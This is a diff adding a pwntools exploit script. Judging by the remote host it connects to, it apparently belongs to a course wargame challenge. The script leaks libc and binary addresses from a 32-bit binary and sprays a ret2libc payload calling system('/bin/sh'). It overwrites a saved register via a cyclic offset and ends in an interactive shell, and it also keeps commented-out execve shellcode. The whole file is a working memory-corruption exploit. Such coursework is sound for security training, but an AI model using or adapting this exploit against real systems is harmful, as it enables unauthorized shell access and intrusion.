@@ -1,0 +1,136 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch='i386')
+exe = './bsl' #Change this
+
+PROGNAME = exe
+REMOTE = "comp6447.wtf" #Change this
+REMOTEPORT = 7230 #Change this
+global p
+global e
+global global_timeout
+
+e = ELF(PROGNAME)
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+continue
+'''.format(**locals())
+
+if args.REMOTE:
+    global_timeout = 3
+    p = remote(REMOTE, REMOTEPORT)
+    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
+    puts_offset = 0x067b40
+else:
+    global_timeout = 0.5
+    p = process(PROGNAME)
+    p = start()
+    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
+    puts_offset = 0xf7d6dca0-0xf7d06000
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# FIrst address leaked is where the puts function is
+# most_fav() writes in a memory region zero'd out
+# by memset perhaps shellcode here.
+# Least favourite number leaks the function address of get_number()
+# May be able to overwrite ebx (originally GOT)
+# Offset of get_number() is 0x713
+# puts can take in ebx-0x2204
+#my_assembly ="""
+#xor ecx, ecx
+#mul ecx
+
+#mov eax, 0xb
+#push 0x68732f2f
+#push 0x6e69622f
+#mov ebx, esp
+#int 0x80
+#"""
+#shellcode1 = asm(my_assembly)
+#nopsled = """
+#nop
+#"""
+#shellcode2 = asm(nopsled)
+pause()
+p.recvuntil(b"(y/n)", drop=True)
+p.sendline(b'y')
+p.recvuntil(b"is: ", drop=True)
+leak_puts = p.recvline()
+log.info(f"puts is @ {leak_puts}")
+
+# puts last 3 bytes: b40 for remote
+# offset of libc for remote is 0x067b40
+# libc 2.27
+libc_base = int(leak_puts, 16) - puts_offset
+libc.address = libc_base
+log.info(f"libc base @ {hex(libc_base)}")
+# For local ==============================
+libc_system = libc.symbols["system"]
+libc_binsh = next(libc.search(b'/bin/sh\00'))
+assert(libc_binsh is not None)
+# For remote ======================================
+#libc_system = libc_base + 0x03d200
+#libc_binsh = libc_base + 0x17e0cf
+
+return_addr_junk = p32(0)
+spray = return_addr_junk + p32(libc_system) + return_addr_junk + p32(libc_binsh)
+align = b'a'*9
+most_fav = align + spray*0x52
+
+p.recvuntil(b"(y/n)", drop=True)
+p.sendline(b'y')
+p.recvuntil(b"number?", drop=True)
+p.sendline(b'0')
+p.recvuntil(b"fact!", drop=True)
+payload = most_fav
+p.sendline(payload)
+
+p.recvuntil(b"(y/n)", drop=True)
+p.sendline(b'y')
+
+p.recvuntil(b"is: ", drop=True)
+leak_get_number = p.recvline()
+log.info(f"get_number is @ {leak_get_number}")
+p.recvuntil(b"yours?", drop=True)
+p.sendline(b'a')
+
+binary_base = int(leak_get_number, 16) - int(0x713)
+log.info(f"binary base at: {hex(binary_base)}")
+
+p.recvuntil(b"not?", drop=True)
+# ebx -> 'baac'
+offset = cyclic_find("baac")
+log.info(f"ebx @ {offset} with buffer size {int(0xd1)}")
+address = p32(binary_base + 0x2fb4)
+
+least_fav = spray*(int(offset/len(payload))) 
+payload = fit({
+    0: spray,
+    offset: address + b'n'*10
+})
+
+p.sendline(payload)
+p.interactive()
+
